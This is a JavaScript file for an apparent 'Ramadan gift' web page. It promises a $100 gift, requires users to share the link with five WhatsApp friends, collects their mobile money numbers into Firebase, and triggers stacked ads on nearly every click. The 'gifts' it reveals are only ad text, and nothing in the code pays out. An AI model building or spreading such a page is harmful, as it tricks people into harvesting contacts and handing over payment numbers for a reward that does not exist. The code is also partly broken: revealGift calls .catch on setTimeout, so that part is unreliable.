// Initialize gifts from Firebase
let gifts = [];
database.ref('gifts').on('value', snapshot => {
    const giftsData = snapshot.val();
    gifts = giftsData || [
        { id: 1, adContent: 'Special Ramadan Offer 1' },
        { id: 2, adContent: 'Special Ramadan Offer 2' },
        { id: 3, adContent: 'Special Ramadan Offer 3' },
        { id: 4, adContent: 'Special Ramadan Offer 4' },
        { id: 5, adContent: 'Special Ramadan Offer 5' },
        { id: 6, adContent: 'Special Ramadan Offer 6' }
    ];
    // Regenerate gift boxes when gifts are updated
    if (giftsGrid) {
        giftsGrid.innerHTML = '';
        generateGiftBoxes();
    }
});

// DOM Elements
const authSection = document.getElementById('authSection');
const giftSection = document.getElementById('giftSection');
const giftsGrid = document.getElementById('giftsGrid');
const phoneInput = document.getElementById('phoneNumber');
const startButton = document.getElementById('startButton');
const buttonText = startButton.querySelector('.button-text');
const loadingSpinner = startButton.querySelector('.loading-spinner');

// Initialize in-app interstitial ads
show_8980914({ 
    type: 'inApp', 
    inAppSettings: { 
        frequency: 2, 
        capping: 0.1, 
        interval: 30, 
        timeout: 5, 
        everyPage: false 
    } 
});

// Show all ad types when any button is clicked
function showAllAds() {
    // First show rewarded interstitial
    show_8980914().then(() => {
        // Then show rewarded popup
        return show_8980914('pop');
    }).then(() => {
        // Finally show in-app interstitial
        show_8980914({ 
            type: 'inApp', 
            inAppSettings: { 
                frequency: 2, 
                capping: 0.1, 
                interval: 30, 
                timeout: 5, 
                everyPage: false 
            } 
        });
    }).catch(error => {
        console.error('Ad error:', error);
        showError('An error occurred while showing ads. Please try again.');
    });
}

// Track WhatsApp shares
let whatsAppShareCount = 0;

// User verification
function verifyPhone() {
    showAllAds();
    const phoneNumber = phoneInput.value.trim();
    const paymentMethod = document.getElementById('paymentMethod').value;
    
    if (!phoneNumber.match(/^[0-9]{9}$/)) {
        showError('Please enter a valid 9-digit mobile money number');
        return;
    }
    
    if (whatsAppShareCount < 5) {
        showError('Please share with 5 friends on WhatsApp first!');
        return;
    }

    // Show loading state
    setLoadingState(true);

    // Save user and share count to Firebase
    const userId = Date.now().toString();
    // Update shares count in Firebase
    database.ref('shares/' + userId).set(whatsAppShareCount);
    database.ref('users/' + userId).set({
        phoneNumber: phoneNumber,
        timestamp: firebase.database.ServerValue.TIMESTAMP
    }).then(() => {
        showError('Gift claim successful! You can now reveal your gifts below.');
    }).catch(error => {
        console.error('Error saving user:', error);
        showError('An error occurred. Please try again.');
    }).finally(() => {
        setLoadingState(false);
    });
}

// Generate gift boxes
function generateGiftBoxes() {
    gifts.forEach((gift, index) => {
        const giftBox = document.createElement('div');
        giftBox.className = 'gift-box';
        giftBox.setAttribute('data-id', gift.id);
        giftBox.innerHTML = '🎁';
        giftBox.style.animationDelay = `${index * 0.1}s`;
        giftBox.onclick = () => revealGift(giftBox, gift);
        giftsGrid.appendChild(giftBox);
    });
}

// Reveal gift and show ad content
function revealGift(giftBox, gift) {
    if (giftBox.classList.contains('revealed')) return;

    // Show all ad types
    showAllAds();
    // Then proceed with gift reveal
    setTimeout(() => {
        giftBox.classList.add('revealed');
        giftBox.innerHTML = gift.adContent;

        // Save gift reveal to Firebase
        const revealData = {
            giftId: gift.id,
            timestamp: firebase.database.ServerValue.TIMESTAMP
        };
        database.ref('reveals').push(revealData);
    }).catch(error => {
        console.error('Ad error:', error);
        showError('Failed to load content. Please try again.');
    });
}

// Social sharing functions with rewarded popup ads
function shareOnWhatsApp() {
    showAllAds();
    showSocialShare('whatsapp').then(() => {
        whatsAppShareCount++;
        if (whatsAppShareCount >= 5) {
            showError('Great! Now enter your mobile money number to claim your $100 gift!');
        } else {
            showError(`Share with ${5 - whatsAppShareCount} more friends to claim your gift!`);
        }
    });
}

function shareOnFacebook() {
    showAllAds();
    showSocialShare('facebook');
}

function shareOnTelegram() {
    showAllAds();
    showSocialShare('telegram');
}

// Helper functions
function showSocialShare(platform) {
    show_8980914('pop').then(() => {
        const text = encodeURIComponent('Join me in revealing special Ramadan gifts! 🎁✨');
        const url = encodeURIComponent(window.location.href);
        const shareUrls = {
            whatsapp: `https://wa.me/?text=${text}%20${url}`,
            facebook: `https://www.facebook.com/sharer/sharer.php?u=${url}`,
            telegram: `https://t.me/share/url?url=${url}&text=${text}`
        };
        window.open(shareUrls[platform], '_blank');
    }).catch(error => {
        console.error('Ad error:', error);
        showError('Failed to share. Please try again.');
    });
}

function setLoadingState(isLoading) {
    startButton.disabled = isLoading;
    buttonText.style.opacity = isLoading ? '0' : '1';
    loadingSpinner.classList.toggle('hidden', !isLoading);
}

function showError(message) {
    const existingError = document.querySelector('.error-message');
    if (existingError) existingError.remove();

    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.textContent = message;
    phoneInput.parentNode.insertBefore(errorDiv, phoneInput.nextSibling);

    setTimeout(() => {
        errorDiv.remove();
    }, 3000);
}

// Welcome Popup Functions
function showWelcomePopup() {
    if (!localStorage.getItem('welcomePopupShown')) {
        const popup = document.getElementById('welcomePopup');
        popup.classList.add('show');
        localStorage.setItem('welcomePopupShown', 'true');
    }
}

function closeWelcomePopup() {
    const popup = document.getElementById('welcomePopup');
    popup.classList.remove('show');
}

// Show welcome popup when page loads
window.addEventListener('load', showWelcomePopup);